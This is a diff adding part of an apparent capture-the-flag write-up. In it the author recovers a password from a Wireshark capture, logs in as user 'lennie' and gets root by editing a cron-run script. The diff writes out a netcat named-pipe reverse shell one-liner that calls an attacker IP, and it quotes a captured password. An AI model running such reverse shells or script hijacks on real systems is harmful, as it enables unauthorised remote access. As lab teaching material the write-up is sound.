@@ -163,3 +163,47 @@ Inside the `/incidents` directory we can see a packet capture called `suspicious
 To get the file to my pc I decided to go simple and use the python http.server module as seen in the image below
 
 ![Exfil](assets/pcap-exfil.png)
+
+Now I'm going to open it in wireshark because I'm assuming it's a packet capture of suspicious activity so we might find how to get into `lennie` from here.
+
+![HTTP Stream](assets/ws-shell.png)
+
+In the HTTP stream we can see the line `Successfully opened reverse shell to 192.168.22.139:4444` So we need to find the traffic to that address.
+
+![TCP Stream](assets/ws-password.png)
+
+To do this I applied the filter `tcp.port == 4444` and looked through the TCP Stream which showed the hacker trying to use the password `c4ntg3t3n0ughsp1c3` for the `www-data` account. I just tried that password for `lennie` and it worked!!!
+
+![Lennie Login](assets/lennie.png)
+
+## Interlude: Challenge 2
+
+Now we can get the user.txt flag
+
+![user.txt](assets/usertxt.png)
+
+## Privilage Escalation: root
+
+Now we need to get `root` so we can read `root.txt`. Inside lennie's home folder their is a `scripts` directory which contains `planner.sh` which runs `/etc/print.sh`
+
+![sciprts](assets/scripts.png)
+
+First I'm going to try get a reverse shell, I added `mkfifo /tmp/lol;nc 10.14.83.34 4444 0</tmp/lol | /bin/sh -i 2>&1 | tee /tmp/lol` to `/etc/print.sh` and tried running `/home/lennie/scripts/planner.sh` but the shell came back using `lennie` instead of `root` so I exited the shell. But when I started another listener I got a shell back as root????
+
+![root shell](assets/root-shell.png)
+
+That completes the challenge
+
+### How did I get a reverse shell as root
+
+We know a few things:
+
+1. The system did it automatically
+2. I really didn't do anything
+
+This leads me to think `crontab` since we are on linux
+
+
+
+
+
